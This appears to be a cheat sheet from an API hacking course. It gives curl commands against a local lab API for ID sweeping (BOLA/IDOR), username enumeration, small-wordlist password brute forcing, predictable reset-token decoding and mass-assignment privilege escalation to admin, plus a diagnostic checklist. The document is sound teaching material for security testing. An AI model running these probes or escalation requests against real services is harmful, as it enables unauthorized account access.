# 🗂️ Cheat Sheet — Stage 4: OWASP Top 10 (Part 1)

## API1:2023 — BOLA/IDOR

```bash
# ID sweep — try sequential IDs with your own token
for id in 1 2 3 4 5; do
  echo "== user $id =="
  curl -s http://localhost:5001/api/v1/users/$id -H "Authorization: Bearer $TOKEN"
done

# Access another user's messages/posts by ID
curl -s http://localhost:5001/api/v1/messages/4 -H "Authorization: Bearer $TOKEN"
curl -s http://localhost:5001/api/v1/posts/2 -H "Authorization: Bearer $TOKEN"   # private post!
```

## API2:2023 — Broken Authentication

```bash
# Enumerate valid usernames via different error messages
curl -s -X POST http://localhost:5001/api/v1/auth/login \
  -d '{"username":"nonexistent","password":"x"}' -H "Content-Type: application/json"
# → "User 'nonexistent' not found" (404) vs "Incorrect password" (401) = enumeration!

# Brute force (lab-controlled, small wordlist only)
for pw in password 123456 password123 admin123; do
  curl -s -X POST http://localhost:5001/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"alice\",\"password\":\"$pw\"}"
done

# Predictable reset token
curl -s -X POST http://localhost:5001/api/v1/auth/reset-password \
  -H "Content-Type: application/json" -d '{"email":"alice@socialhack.local"}'
# reset_token = base64(username:timestamp) — decode with:
echo "<token>" | base64 -d
```

## API3:2023 — Mass Assignment

```bash
# Register with extra fields
curl -s -X POST http://localhost:5001/api/v1/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"evil","email":"evil@x.com","password":"x","role":"admin","is_verified":true}'

# Update own profile with role field
curl -s -X PUT http://localhost:5001/api/v1/users/1 \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

## Quick Diagnostic Checklist

```
[ ] Does changing the ID in the URL return someone else's data?     → BOLA
[ ] Are error messages different for wrong-username vs wrong-pass?  → Enum
[ ] Can I decode the reset token to guess future tokens?            → Predictable token
[ ] Does the update endpoint accept fields I didn't send in the UI? → Mass Assignment
[ ] Does the response include role/is_verified/api_key etc.?        → Excessive exposure
```

---
*SocialHack API Hacking Course — Stage 4 Cheat Sheet*
